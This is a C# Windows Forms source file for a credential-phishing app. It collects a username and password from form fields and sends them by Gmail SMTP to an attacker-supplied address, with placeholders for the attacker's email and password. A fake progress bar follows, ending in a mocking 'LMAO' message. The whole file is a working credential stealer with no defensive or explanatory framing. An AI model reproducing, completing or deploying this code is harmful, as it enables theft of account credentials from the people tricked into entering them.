using System;
using System.Net;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;

namespace Mikmak
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Start();


            MailMessage mail = new MailMessage();
            SmtpClient server = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("YOUR EMAIL");
            mail.To.Add("YOUR EMAIL");
            mail.Subject = "Important!";
            mail.Body = "NAME OF THE EMAIL IT WILL SEND THE INFO ON" + id_name.Text + "                    Password:" + password.Text;
            server.Port = 587;
            server.Credentials = new System.Net.NetworkCredential("YOUR EMAIL", "EMAIL PASSWORD");
            server.EnableSsl = true;
            server.Send(mail);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            progressBar1.Increment(1);
            if (progressBar1.Value == 100)
            {
                timer1.Stop();
                MessageBox.Show("LMAO");
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void pictureBox18_Click(object sender, EventArgs e)
        {

        }
    }
}
